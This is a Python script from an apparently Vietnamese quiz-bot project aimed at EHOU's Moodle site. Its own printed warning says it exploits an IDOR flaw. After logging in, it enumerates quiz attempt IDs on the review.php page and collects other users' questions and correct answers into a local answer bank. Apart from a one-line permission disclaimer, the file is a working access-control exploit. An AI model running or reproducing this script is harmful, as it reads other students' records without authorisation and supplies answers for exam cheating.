# ehou_quiz_bot/bank_builder.py

import getpass
import time
from core.ehou_client import EhouClient
from core.quiz_parser import QuizParser
from database.question_bank import QuestionBank
from config import settings

def build_question_bank():
    print("--- BẮT ĐẦU KỊCH BẢN XÂY DỰNG NGÂN HÀNG CÂU HỎI ---")
    print("[!] Cảnh báo: Kịch bản này khai thác lỗ hổng IDOR. Chỉ sử dụng với sự cho phép.")

    username = input("Nhập username EHOU: ")
    password = getpass.getpass("Nhập password EHOU: ")

    try:
        start_id = int(input("Nhập 'attempt ID' bắt đầu để quét: "))
        count = int(input("Nhập số lượng 'attempt' muốn quét: "))
    except ValueError:
        print("[-] ID và số lượng phải là số nguyên.")
        return

    ehou_client = EhouClient(username, password)
    question_bank = QuestionBank()
    
    stats_count, stats_path = question_bank.get_stats()
    print(f"\n[*] Ngân hàng câu hỏi hiện tại: {stats_count} câu hỏi (tại '{stats_path}').")

    if not ehou_client.login():
        return

    base_review_url = f"{settings.EHOU_BASE_URL}/mod/quiz/review.php?attempt="
    new_questions_found = 0

    for i in range(count):
        attempt_id = start_id + i
        target_url = f"{base_review_url}{attempt_id}"
        
        print(f"\n--- [{i+1}/{count}] Đang quét attempt ID: {attempt_id} ---")
        
        html_content = ehou_client.get_page_content(target_url)

        if not html_content:
            print("[-] Không nhận được nội dung. Bỏ qua.")
            time.sleep(1)
            continue

        parser = QuizParser(html_content)
        qa_pairs = parser.extract_questions_with_answers()

        if not qa_pairs:
            print("[*] Không có câu hỏi/đáp án nào được tìm thấy trên trang này.")
        else:
            for question, answer in qa_pairs.items():
                if question_bank.add_question(question, answer):
                    new_questions_found += 1
                    print(f"  [+] Đã thêm câu hỏi mới: {question[:50]}...")
        
        time.sleep(settings.DELAY_BETWEEN_BANK_CRAWLS)

    print("\n--- KẾT THÚC QUÁ TRÌNH QUÉT ---")
    final_count, _ = question_bank.get_stats()
    print(f"[+] Tìm thấy {new_questions_found} câu hỏi mới.")
    print(f"[+] Tổng số câu hỏi trong ngân hàng: {final_count}.")

if __name__ == "__main__":
    build_question_bank()